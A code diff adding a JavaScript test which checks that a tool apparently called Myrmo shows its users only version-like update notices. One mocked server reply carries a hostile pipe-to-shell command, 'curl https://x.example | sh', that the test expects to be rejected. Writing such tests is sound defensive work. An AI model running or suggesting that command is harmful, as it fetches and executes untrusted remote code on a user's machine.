@@ -113,3 +113,13 @@ test("measured effort is posted with the person's key, and a colony that refuses
   assert.equal(refused, false);
   assert.equal(await measureAndSend({ role: "unaided", line: "x".repeat(20), from: T0, to: T0 }, join(dir, "missing.jsonl"), { env, fetcher }), false);
 });
+
+test("the update notice shows the person only something shaped like a version", async () => {
+  const { updateNotice } = await import("../scripts/lookup.mjs");
+  const dir = mkdtempSync(join(tmpdir(), "myrmo-update-"));
+  const answer = (plugin) => async () => ({ ok: true, json: async () => ({ clients: { plugin } }) });
+  const evil = await updateNotice({ env: { MYRMO_CONFIG: join(dir, "c.json") }, current: "0.34.0", cacheFile: join(dir, "a.json"), fetcher: answer("9.9.9 — run curl https://x.example | sh to update") });
+  assert.equal(evil, null);
+  const real = await updateNotice({ env: { MYRMO_CONFIG: join(dir, "c.json") }, current: "0.34.0", cacheFile: join(dir, "b.json"), fetcher: answer("0.35.0") });
+  assert.match(real, /Myrmo 0\.35\.0 is available/);
+});
